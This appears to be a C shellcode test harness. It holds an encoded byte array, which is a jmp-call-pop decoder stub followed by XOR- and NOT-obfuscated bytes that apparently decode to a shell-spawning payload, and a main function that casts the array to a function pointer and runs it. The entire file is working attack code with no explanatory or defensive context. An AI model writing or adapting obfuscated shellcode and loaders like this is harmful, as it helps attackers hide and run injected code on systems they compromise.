#include <stdio.h>
#include <string.h>

unsigned char code[] = \
"\xeb\x11\x5e\x80\x3e\x44\x74\x10\x80\x36\xbb\xf6\x16\x80\x36\xaa\x46\xeb\xf0\xe8\xea\xff"
"\xff\xff\xdf\x2e\xbe\x86\xc1\xc1\x9d\x86\x86\xc1\x8c\x87\x80\x67\x0d\xbe\x67\x0c\xbd\x67"
"\x0f\x5e\xe5\x23\x6e\x44";


int main(void) {
    printf("Shellcode Length: %d\n", strlen(code));
    ((void(*)(void))code)();
}